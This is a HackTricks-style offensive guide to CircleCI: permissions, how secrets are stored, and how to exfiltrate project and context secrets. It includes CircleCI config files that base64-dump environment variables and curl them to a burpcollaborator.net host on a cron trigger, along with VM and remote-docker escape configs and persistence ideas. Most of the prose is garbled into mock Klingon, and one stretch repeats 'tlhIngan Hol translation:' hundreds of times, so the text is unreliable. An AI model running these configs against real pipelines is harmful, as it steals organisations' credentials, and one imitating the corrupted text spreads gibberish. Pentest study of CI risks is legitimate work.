# CircleCI Security

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Basic Information

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) is a Continuos Integration platform where you can **define templates** indicating what you want it to do with some code and when to do it. This way you can **automate testing** or **deployments** directly **from your repo master branch** for example.

## Permissions

**CircleCI** **inherits the permissions** from github and bitbucket related to the **account** that logs in.\
In my testing I checked that as long as you have **write permissions over the repo in github**, you are going to be able to **manage its project settings in CircleCI** (set new ssh keys, get project api keys, create new branches with new CircleCI configs...).

However, you need to be a a **repo admin** in order to **convert the repo into a CircleCI project**.

## Env Variables & Secrets

According to [**the docs**](https://circleci.com/docs/2.0/env-vars/) there are different ways to **load values in environment variables** inside a workflow.

### Built-in env variables

Every container run by CircleCI will always have [**specific env vars defined in the documentation**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) like `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` or `CIRCLE_USERNAME`.

### Clear text

You can declare them in clear text inside a **command**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
**run environment**-Da vItlhutlh **clear text**-Da vItlhutlhDaq.
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
**build-job environment**-Da cha'loghDI' 'e' vItlhutlh.
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
**tlhIngan Hol**:
ghItlhvam **container** **environment** vItlhutlh. 

**English**:
ghItlhvam **container** **environment** vItlhutlh.
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Project Secrets

**Qap** vItlhutlh **secrets** 'ej **project** (ghaH **branch**).\
**vItlhutlh** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ **vItlhutlh**.

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
"**Import Variables**" **chel** **variables** **import** **projects** **vItlhutlh**.
{% endhint %}

### Context Secrets

**Qap** vItlhutlh **secrets** **org wide**. **Default repo** **vItlhutlh** **access** **secrets** **stored**:

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
Qap **group** (All members **chel**) **secrets** **access** **specific people** **vItlhutlh**.\
**Qap** **secrets security** **increase** **best ways** **vItlhutlh**, **access** **people**.
{% endhint %}

## Attacks

### Search Clear Text Secrets

**VCS** (github **chel**) **access** **file** `.circleci/config.yml` **repo** **branch** **search** **clear text secrets** **stored**.

### Secret Env Vars & Context enumeration

**Code** **secrets names** **found** `.circleci/config.yml` **file**. **Context names** **files** **check** **web console**: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Exfiltrate Project secrets

{% hint style="warning" %}
**exfiltrate ALL** **project** **context SECRETS** **WRITE** **access** **1 repo** **github org** (_account** access** **contexts** **default everyone** **access** **context_).
{% endhint %}

{% hint style="danger" %}
"**Import Variables**" **chel** **variables** **import** **projects** **vItlhutlh**. **attacker** **import** **project variables** **repos** **exfiltrate**.
{% endhint %}

**project secrets** **set** **env** **jobs**, **calling env** **obfuscating** **base64** **exfiltrate** **secrets** **workflows web log console**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
**ghItlhvam** **web console** **ghItlhvam** **repo** **'ej** CircleCI **vaj** **ghItlhvam** **workflow** **cha'logh** **cha'logh** **'ej** **'oH** **secrets** **'ej** **'oH** **external address** **qach** **exfils**.

```yaml
version: 2.1
workflows:
  version: 2
  exfil-secrets:
    jobs:
      - exfil:
          filters:
            branches:
              only: master
          steps:
            - run:
                name: Exfil secrets
                command: |
                  curl -X POST -H "Content-Type: application/json" -d '{"secret": "YOUR_SECRET", "address": "EXTERNAL_ADDRESS"}' https://your-external-server.com
```

**ghItlhvam** **web console** **ghItlhvam** **repo** **'ej** CircleCI **vaj** **ghItlhvam** **workflow** **cha'logh** **cha'logh** **'ej** **'oH** **secrets** **'ej** **'oH** **external address** **qach** **exfils**.
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Exfiltrate Context Secrets

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation:**

**tlhIngan Hol translation
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
**ghItlhvam** **web console** **ghItlhvam** **repo** **'ej** CircleCI **vay'** **vItlhutlh** **workflow** **'ej** **vItlhutlh** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej** **'ej
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Qa'wI' `.circleci/config.yml` file jImej **circleci build** chaw' 'e' vItlhutlh. **circleci console** vItlhutlh.
{% endhint %}

### Escape to Cloud

**CircleCI** vItlhutlh **machines Hoch 'ej Hoch** **your builds** vaj **run**.\
**machines Hoch** GCP, 'ej initially relevant vItlhutlh. However, **victim** **tasks** **machines Hoch** **(potentially, cloud env)**, **cloud metadata endpoint** **interesting information** vItlhutlh.

**previous examples** launched **docker container** 'e' vItlhutlh, **VM machine** **launch** **ask** **(different cloud permissions)**:
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
**Or even a docker container with access to a remote docker service:**

**qaStaHvIS Docker container vItlhutlh:**

```
<code>
```

**<code>**
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### QIb

* **CircleCI** API endpoints vItlh **user tokens** **chel** **tlhIngan** **access**.
* _https://app.circleci.com/settings/user/tokens_
* **Projects tokens** **chel** **tlhIngan** **access** **project** **permissions** **token**.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* **SSH keys** **chel** **tlhIngan** **projects**.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* **Hidden branch** **leaking** **context env** **vars** **everyday** **cron job** **chel** **create**.
* **Known job** **modify**/**branch** **create** **leak** **context** **projects secrets** **everyday**.
* **Github owner** **allow unverified orbs** **configure** **backdoor** **job** **chel**.
* **Command injection vulnerability** **chel** **task** **inject commands** **secret** **value** **modify**.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>tlhIngan</strong></a><strong>!</strong></summary>

**HackTricks** **support** **ways**:

* **HackTricks** **advertised** **company** **want** **Check** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **HackTricks** **PDF** **download**.
* **PEASS & HackTricks swag** [**official**](https://peass.creator-spring.com) **Get**.
* **PEASS Family** [**The**](https://opensea.io/collection/the-peass-family) **exclusive** [**NFTs**](https://opensea.io/collection/the-peass-family) **collection** **Discover**.
* **Discord group** üí¨ [**Join**](https://discord.gg/hRep4RUj7f) **telegram group** [**the**](https://t.me/peass) **follow** **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **hacking tricks** **Share** **PRs** **submitting** **by** [**HackTricks**](https://github.com/carlospolop/hacktricks) **HackTricks Cloud** [**the**](https://github.com/carlospolop/hacktricks-cloud) **github repos**.

</details>
